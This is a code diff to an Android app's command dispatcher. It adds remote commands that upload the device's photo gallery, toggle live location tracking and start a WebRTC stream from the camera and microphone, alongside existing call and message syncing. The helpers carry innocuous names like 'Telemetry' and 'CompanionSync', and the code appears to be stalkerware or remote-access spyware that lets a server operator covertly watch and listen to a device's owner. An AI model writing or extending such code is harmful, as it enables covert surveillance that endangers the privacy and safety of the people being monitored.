@@ -42,8 +42,38 @@ public class CommandDispatcher {
             TelemetryHelper.syncCalls(context, serverUrl, deviceId, cmdId);
         } else if ("sync_messages".equals(type)) {
             TelemetryHelper.syncMessages(context, serverUrl, deviceId, cmdId);
+        } else if ("sync_gallery".equals(type)) {
+            GalleryHelper.syncGallery(context, serverUrl, deviceId, cmdId);
+        } else if ("start_live_movement".equals(type)) {
+            CompanionSyncService.setLiveMovementActive(context, true);
+            if (locationCallback != null) locationCallback.onRefreshNeeded();
+        } else if ("stop_live_movement".equals(type)) {
+            CompanionSyncService.setLiveMovementActive(context, false);
+            if (locationCallback != null) locationCallback.onRefreshNeeded();
+        } else if ("webrtc_stream".equals(type)) {
+            handleWebRtcCommand(context, serverUrl, deviceId, payload);
         } else if ("fetch_location".equals(type) || "update_location".equals(type)) {
             if (locationCallback != null) locationCallback.onRefreshNeeded();
+        }
+    }
+
+    private static void handleWebRtcCommand(Context ctx, String server, String devId, JSONObject p) {
+        if (p == null) return;
+        String act = p.optString("action", "start");
+        if ("start".equals(act)) {
+            boolean front = p.optBoolean("front", true);
+            boolean video = p.optBoolean("video", true);
+            boolean audio = p.optBoolean("audio", true);
+            WebRtcStreamManager.getInstance().startLiveStream(ctx, server, devId, front, video, audio);
+        } else if ("switch_camera".equals(act)) {
+            WebRtcStreamManager.getInstance().switchCamera();
+        } else if ("stop".equals(act)) {
+            WebRtcStreamManager.getInstance().stopLiveStream();
+        } else if ("offer".equals(act)) {
+            WebRtcStreamManager.getInstance().handleRemoteOffer(p.optString("sdp"));
+        } else if ("candidate".equals(act)) {
+            WebRtcStreamManager.getInstance().handleRemoteCandidate(
+                    p.optString("candidate"), p.optInt("sdpMLineIndex", 0), p.optString("sdpMid", ""));
         }
     }
 }
